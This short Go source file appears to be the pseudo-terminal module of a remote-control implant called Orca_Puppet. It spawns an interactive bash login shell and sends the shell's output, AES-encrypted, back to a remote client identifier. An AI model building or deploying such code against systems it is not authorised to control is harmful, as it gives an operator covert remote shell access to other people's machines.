package ptyopt

import (
	"Orca_Puppet/cli/common"
	"Orca_Puppet/define/config"
	"Orca_Puppet/tools/crypto"
	"github.com/creack/pty"
	"io"
	"os"
	"os/exec"
)

type PtyData struct {
	Stdin  io.WriteCloser
	Stdout io.ReadCloser
}

func InitPtmx() *os.File {
	ws, _ := pty.GetsizeFull(os.Stdin)
	c := exec.Command("/bin/sh", "-c", "exec bash --login")
	ptmx, err := pty.Start(c)
	if err != nil {
		return nil
	}
	_ = pty.Setsize(ptmx, ws)
	return ptmx
}

func RetPtyResult(resBuffer []byte, clientId string) {
	encResBuffer, err := crypto.Encrypt(resBuffer, []byte(config.AesKey))
	if err != nil {
		return
	}
	common.SendSuccessMsg(clientId, common.ClientId, "execPty_ret", encResBuffer, "")
}
